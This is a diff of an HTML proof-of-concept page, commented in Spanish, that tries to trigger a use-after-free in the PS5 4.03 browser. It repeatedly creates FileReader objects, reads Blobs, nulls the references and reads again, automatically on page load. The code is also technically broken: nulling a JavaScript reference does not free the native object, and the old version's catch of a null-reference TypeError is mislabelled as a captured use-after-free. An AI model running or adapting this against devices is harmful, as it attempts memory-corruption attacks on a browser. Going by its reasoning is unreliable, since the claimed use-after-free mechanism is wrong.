@@ -1,58 +1,53 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC Use-After-Free FileReader PS5 4.03</title>
-</head>
+<head><title>PoC Use-After-Free Agresivo PS5 4.03</title></head>
 <body>
-    <h1>PoC Use-After-Free FileReader</h1>
-    <p>Si la consola es vulnerable, el navegador se bloqueará o mostrará comportamiento errático.</p>
+<h1>Prueba Use-After-Free Agresivo FileReader</h1>
+<script>
+function aggressiveUAF() {
+    let count = 0;
+    const total = 100;
+    const intervalMs = 50;
 
-    <script>
-    // Crea un objeto FileReader
-    let fr;
+    function createAndFree() {
+        if (count >= total) {
+            console.log("Test terminado.");
+            return;
+        }
 
-    function triggerUseAfterFree() {
         try {
-            // Crear un blob pequeño
-            let blob = new Blob(["Exploit"], { type: "text/plain" });
+            // Blob más grande
+            let blob = new Blob([new Array(1000).fill('A').join('')], { type: "text/plain" });
 
-            fr = new FileReader();
+            // Crear FileReader
+            let fr = new FileReader();
 
-            // Listener de evento 'loadend'
             fr.onloadend = function() {
-                // Intenta usar el FileReader después de liberado
-                // Aquí forzamos read para que se libere y luego otra llamada que puede fallar
                 try {
-                    fr.readAsText(blob);  // Lee el blob (normal)
-                } catch(e) {
-                    console.log("Error segunda lectura:", e);
+                    // Intento de read después de carga para forzar potencial UAF
+                    fr.readAsText(blob);
+                } catch (e) {
+                    console.log("Error lectura:", e);
                 }
             };
 
-            // Primer read para iniciar el proceso
             fr.readAsText(blob);
 
-            // Liberar referencia y forzar GC para potencial uso posterior
+            // Liberar la referencia
             fr = null;
-
-            // Forzamos a que se recolecte basura (no garantiza)
-            if (window.gc) window.gc();
-
-            // Volver a llamar con delay para usar objeto ya liberado
-            setTimeout(() => {
-                try {
-                    fr.readAsText(blob);  // Intento agresivo que debe fallar si está liberado
-                } catch(e) {
-                    console.log("Intento de use-after-free capturado:", e);
-                }
-            }, 100);
-        } catch (ex) {
-            console.error("Error general:", ex);
+            blob = null;
+        } catch (e) {
+            console.log("Error general:", e);
         }
+
+        count++;
+        setTimeout(createAndFree, intervalMs);
     }
 
-    // Ejecutar el trigger al cargar
-    window.onload = triggerUseAfterFree;
-    </script>
+    createAndFree();
+}
+
+window.onload = aggressiveUAF;
+</script>
 </body>
 </html>
